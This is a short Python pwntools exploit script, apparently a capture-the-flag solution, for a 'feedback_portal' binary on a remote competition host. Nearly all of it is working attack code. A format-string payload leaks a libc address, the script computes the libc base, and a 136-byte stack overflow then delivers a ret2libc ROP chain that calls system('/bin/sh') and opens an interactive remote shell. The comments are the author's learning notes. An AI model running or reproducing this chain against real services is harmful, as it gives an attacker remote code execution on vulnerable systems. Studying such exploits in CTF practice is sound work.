#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)


HOST,PORT= "offsec.m0lecon.it", 13505
OFFSET_TO_RIP=136


p= remote(HOST,PORT)
#p = process(elf.path)
p.recvuntil(b'name:\n')
p.sendline(b'%25$p')
#p.sendline(b'%47$p')
leacked_line = p.recvline().strip()

leaked_libc = int(leacked_line.split(b',')[1].strip(), 16)
print(f"Leaked address: {hex(leaked_libc)}")

#1stage --> The idea is to leak an address of libc, specifically the  "__libc_start_main" since i saw with ghydra 
offset_inside_lbc=0x29d90 #libc.sym["__libc_start_main"]
offset_inside_function = 0x75
libc_base=leaked_libc-offset_inside_lbc-offset_inside_function
libc_base=libc_base & ~0xfff # <-- Here i set to 0 the last 12 bits (why?)


print(f"Libc start main from symbol:{hex(offset_inside_lbc)}")
print(hex(libc_base))



#2 stage --> Now that i have the libc base address i can set it, in order to calculate the right addresses when i retrieve the gadjects
libc.address=libc_base
rop= ROP(libc)
POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
RET       = rop.find_gadget(['ret'])[0]
BINSH = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']

log.success(f"libc base = {hex(libc.address)}")
log.success(f"system    = {hex(system_addr)}")
log.success(f"/bin/sh   = {hex(BINSH)}")
p.recvuntil(b'feedback:\n')

stage2 = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET),          # stack alignment
    p64(POP_RDI),
    p64(BINSH),
    p64(system_addr),

)
p.sendline(stage2)
p.interactive()


#0x7f3ee26eff75 <-- leak: __libc_start_call_main + 117
#0x29d90 <-- offset del simbolo __libc_start_call_main dentro libc 
#0x75 <-- 117 in decimale, offset interno alla funzione
#>>> print("".join(f"%{i}$lx." for i in range(10, 10)))

"""
_leak - libc.sym['__libc_start_call_main'] - 0x75
libc.address &= ~0xfff
"""
